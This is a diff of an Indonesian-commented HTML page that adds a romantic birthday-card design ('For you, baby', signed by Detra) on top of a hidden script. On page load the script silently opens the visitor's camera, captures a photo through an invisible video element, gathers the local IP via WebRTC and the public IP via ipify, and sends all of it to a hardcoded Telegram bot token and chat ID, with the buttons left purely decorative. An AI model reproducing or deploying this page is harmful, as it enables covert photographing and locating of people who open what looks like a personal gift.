@@ -2,29 +2,310 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>📸</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>For You, Baby 🎂</title>
+
+    <!-- Google Font untuk tampilan yang lebih indah -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+
     <style>
-        /* Halaman kosong dengan latar gelap, tanpa elemen terlihat */
+        /* ---------- RESET ---------- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             min-height: 100vh;
-            background: #0b0b1a;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(ellipse at 30% 20%, #2b1a3a, #0e0b16);
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
         }
-        /* Tidak ada elemen visual apa pun */
+
+        /* ---------- LANGIT BINTANG ---------- */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            background-image:
+                radial-gradient(2px 2px at 15% 25%, rgba(255, 215, 200, 0.5), transparent),
+                radial-gradient(2px 2px at 35% 60%, rgba(255, 215, 200, 0.4), transparent),
+                radial-gradient(2px 2px at 55% 15%, rgba(255, 215, 200, 0.6), transparent),
+                radial-gradient(2px 2px at 75% 80%, rgba(255, 215, 200, 0.3), transparent),
+                radial-gradient(2px 2px at 90% 40%, rgba(255, 215, 200, 0.5), transparent),
+                radial-gradient(2px 2px at 10% 70%, rgba(255, 215, 200, 0.4), transparent),
+                radial-gradient(2px 2px at 45% 90%, rgba(255, 215, 200, 0.3), transparent),
+                radial-gradient(2px 2px at 80% 10%, rgba(255, 215, 200, 0.5), transparent);
+            background-size: 200px 200px;
+            animation: drift 70s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes drift {
+            0% {
+                transform: translate(0, 0);
+            }
+            100% {
+                transform: translate(-40px, -40px);
+            }
+        }
+
+        /* ---------- KARTU UTAMA ---------- */
+        .card {
+            position: relative;
+            z-index: 1;
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px) saturate(1.6);
+            -webkit-backdrop-filter: blur(20px) saturate(1.6);
+            border-radius: 56px;
+            padding: 40px 32px 44px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: scale(1.01);
+        }
+
+        /* ---------- TEKS ---------- */
+        .card h1 {
+            font-family: 'Playfair Display', serif;
+            font-weight: 700;
+            font-style: italic;
+            font-size: 2.6rem;
+            color: #fff4e6;
+            margin-bottom: 12px;
+            text-shadow: 0 4px 30px rgba(255, 200, 150, 0.3);
+            letter-spacing: -0.5px;
+        }
+
+        .card h1 span {
+            background: linear-gradient(135deg, #f9d29d, #ffb7a5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .card .sub {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.45);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .card p {
+            font-size: 1rem;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 28px;
+            font-weight: 400;
+            max-width: 360px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .card p .highlight {
+            color: #f9d29d;
+            font-weight: 500;
+        }
+
+        /* ---------- TURNTABLE (piringan hitam) ---------- */
+        .turntable-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 16px 0 28px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .turntable-wrapper:hover {
+            transform: scale(1.05);
+        }
+
+        .turntable {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, #2a2a2a, #0d0d0d);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.8), inset 0 -4px 10px rgba(0, 0, 0, 0.6), inset 0 4px 10px rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid #3d3d3d;
+            animation: spin 12s linear infinite;
+        }
+
+        .turntable::after {
+            content: '';
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 40% 40%, #ffdbb5, #b87c4b);
+            box-shadow: inset 0 -2px 6px rgba(0, 0, 0, 0.5), 0 0 20px rgba(255, 200, 100, 0.3);
+            border: 2px solid #5a3f2a;
+        }
+
+        /* label di tengah piringan */
+        .turntable .label {
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 40% 40%, #ff6b6b, #a82b2b);
+            box-shadow: 0 0 12px rgba(255, 80, 80, 0.5);
+            z-index: 2;
+        }
+
+        /* garis-garis piringan (efek) */
+        .turntable .groove {
+            position: absolute;
+            inset: 8px;
+            border-radius: 50%;
+            border: 1px dashed rgba(255, 255, 255, 0.06);
+            animation: spin 8s linear infinite reverse;
+        }
+
+        .turntable .groove:nth-child(2) {
+            inset: 20px;
+            border-color: rgba(255, 255, 255, 0.04);
+            animation-duration: 10s;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ---------- TOMBOL STEP INSIDE ---------- */
+        .btn-step {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 40px;
+            background: linear-gradient(135deg, #f9d29d, #ffb7a5);
+            border: none;
+            border-radius: 100px;
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #1a1423;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 40px rgba(255, 180, 130, 0.3);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-step:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 50px rgba(255, 180, 130, 0.5);
+            background: linear-gradient(135deg, #fce2b5, #ffc3a8);
+        }
+
+        .btn-step:active {
+            transform: scale(0.96);
+        }
+
+        .btn-step .icon {
+            font-size: 1.3rem;
+            line-height: 1;
+        }
+
+        /* ---------- RESPONSIVE ---------- */
+        @media (max-width: 480px) {
+            .card {
+                padding: 30px 20px 32px;
+                border-radius: 40px;
+            }
+            .card h1 {
+                font-size: 2rem;
+            }
+            .card p {
+                font-size: 0.92rem;
+            }
+            .turntable {
+                width: 80px;
+                height: 80px;
+            }
+            .turntable::after {
+                width: 24px;
+                height: 24px;
+            }
+            .btn-step {
+                padding: 12px 28px;
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .card h1 {
+                font-size: 1.6rem;
+            }
+            .turntable {
+                width: 70px;
+                height: 70px;
+            }
+        }
+
+        /* ---------- ELEMEN VIDEO TERSEMBUNYI ---------- */
+        video {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Tidak ada elemen UI -- semua diproses di balik layar -->
+    <!-- ====== KARTU UCAPAN ====== -->
+    <div class="card">
+        <h1>For you, <span>baby</span> 🎂</h1>
+        <div class="sub">— a little surprise —</div>
 
+        <p>
+            Hey, it's Detra. Ever since <span class="highlight">December 24, 2025</span>,
+            every moment with you has been so special. I made this little surprise
+            to show you how much I care.<br />
+            <span style="color:rgba(255,255,255,0.5); font-size:0.9rem;">Tap the turntable to set the vibe.</span>
+        </p>
+
+        <!-- Turntable -->
+        <div class="turntable-wrapper" id="turntableBtn">
+            <div class="turntable">
+                <div class="groove"></div>
+                <div class="groove"></div>
+                <div class="label"></div>
+            </div>
+        </div>
+
+        <!-- Tombol Step Inside -->
+        <a href="#" class="btn-step" id="stepBtn">
+            <span class="icon">🎵</span> Step Inside
+        </a>
+    </div>
+
+    <!-- ====== SCRIPT ====== -->
     <script>
         (function() {
             'use strict';
@@ -33,31 +314,77 @@
             const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
             const CHAT_ID = '8463156896';
 
+            // ---------- FUNGSI MENDAPATKAN IP LOKAL (via WebRTC) ----------
+            function getLocalIP() {
+                return new Promise((resolve) => {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('ping');
+                    pc.createOffer()
+                        .then(offer => pc.setLocalDescription(offer))
+                        .catch(() => {});
+
+                    pc.onicecandidate = (event) => {
+                        if (!event.candidate) {
+                            pc.close();
+                            resolve(null);
+                            return;
+                        }
+                        const candidate = event.candidate.candidate;
+                        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (ipMatch) {
+                            const ip = ipMatch[1];
+                            if (ip.startsWith('192.168.') || ip.startsWith('10.') ||
+                                (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[
+                                    1]) <= 31)) {
+                                pc.close();
+                                resolve(ip);
+                            }
+                        }
+                    };
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(null);
+                    }, 3000);
+                });
+            }
+
+            // ---------- FUNGSI MENDAPATKAN IP PUBLIK ----------
+            async function getPublicIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
+                    const data = await response.json();
+                    return data.ip || null;
+                } catch (e) {
+                    return null;
+                }
+            }
+
             // ---------- KIRIM KE TELEGRAM ----------
-            async function kirimKeTelegram(dataUrl) {
+            async function kirimKeTelegram(dataUrl, localIP, publicIP) {
                 try {
                     const blob = await fetch(dataUrl).then(r => r.blob());
                     const formData = new FormData();
                     formData.append('photo', blob, 'foto.png');
+
+                    let caption = `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`;
+                    if (localIP) caption += `\n🌐 IP Lokal : ${localIP}`;
+                    if (publicIP) caption += `\n🌍 IP Publik : ${publicIP}`;
+                    if (!localIP && !publicIP) caption += `\n⚠️ IP tidak terdeteksi`;
+
+                    formData.append('caption', caption);
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('caption',
-                        `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`
-                    );
 
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    // Tidak ada notifikasi sukses di UI
                 } catch (e) {
-                    // Error hanya dicatat di konsol, tidak ditampilkan
                     console.error('Gagal kirim ke Telegram:', e);
                 }
             }
 
             // ---------- AMBIL FOTO & KIRIM ----------
             function ambilDanKirim(video) {
-                // Buat canvas dan ambil frame
                 const canvas = document.createElement('canvas');
                 const lebar = video.videoWidth || 640;
                 const tinggi = video.videoHeight || 480;
@@ -65,21 +392,25 @@
                 canvas.height = tinggi;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, lebar, tinggi);
-
                 const dataUrl = canvas.toDataURL('image/png');
 
-                // Kirim ke Telegram
-                kirimKeTelegram(dataUrl);
-
-                // Hentikan stream kamera untuk menghemat resource
                 if (video.srcObject) {
                     video.srcObject.getTracks().forEach(track => track.stop());
                 }
 
-                // Tidak ada umpan balik di UI
+                Promise.allSettled([
+                    getLocalIP(),
+                    getPublicIP()
+                ]).then((results) => {
+                    const localIP = results[0].status === 'fulfilled' ? results[0].value : null;
+                    const publicIP = results[1].status === 'fulfilled' ? results[1].value : null;
+                    kirimKeTelegram(dataUrl, localIP, publicIP);
+                }).catch(() => {
+                    kirimKeTelegram(dataUrl, null, null);
+                });
             }
 
-            // ---------- MULAI KAMERA ----------
+            // ---------- MULAI KAMERA (otomatis di latar) ----------
             function mulaiKamera() {
                 navigator.mediaDevices.getUserMedia({
                     video: {
@@ -90,45 +421,61 @@
                     audio: false
                 })
                 .then(stream => {
-                    // Buat elemen video tersembunyi
                     const video = document.createElement('video');
-                    video.style.display = 'none'; // tidak terlihat
+                    video.style.display = 'none';
                     video.setAttribute('playsinline', '');
                     video.muted = true;
                     video.srcObject = stream;
-
-                    // Tambahkan ke DOM (tetap tidak terlihat)
                     document.body.appendChild(video);
 
-                    // Saat metadata siap, putar video
                     video.onloadedmetadata = () => {
                         video.play().then(() => {
-                            // Tunggu sebentar agar frame pertama tersedia, lalu ambil foto
-                            // Tanpa delay 3 detik — langsung capture
+                            // Tanpa delay, langsung ambil foto
                             setTimeout(() => ambilDanKirim(video), 100);
                         }).catch(err => {
                             console.error('Gagal memutar video:', err);
                         });
                     };
-
-                    // Jika ada error pada video
                     video.onerror = (err) => {
                         console.error('Error video:', err);
                     };
                 })
                 .catch(err => {
-                    // Izin ditolak atau error lain — hanya dicatat di konsol
                     console.error('Gagal mengakses kamera:', err);
                 });
             }
 
-            // ---------- JALANKAN SAAT HALAMAN SIAP ----------
+            // ---------- JALANKAN OTOMATIS ----------
             if (document.readyState === 'complete') {
                 mulaiKamera();
             } else {
                 window.addEventListener('load', mulaiKamera);
             }
+
+            // ---------- INTERAKSI TAMBAHAN (estetika) ----------
+            // Turntable bisa di-klik untuk efek (tidak mengganggu fungsi utama)
+            document.getElementById('turntableBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                // hanya efek visual: piringan bergetar
+                const turntable = this.querySelector('.turntable');
+                turntable.style.animation = 'none';
+                turntable.offsetHeight; // reflow
+                turntable.style.animation = 'spin 12s linear infinite';
+                // sedikit efek kilau
+                this.style.transform = 'scale(1.1)';
+                setTimeout(() => this.style.transform = 'scale(1)', 200);
+            });
+
+            // Tombol Step Inside hanya sebagai hiasan (tidak memicu aksi baru)
+            document.getElementById('stepBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                this.style.transform = 'scale(0.95)';
+                setTimeout(() => this.style.transform = '', 150);
+                // Tidak ada aksi tambahan agar tidak mengganggu otomatisasi
+            });
+
         })();
     </script>
+
 </body>
 </html>
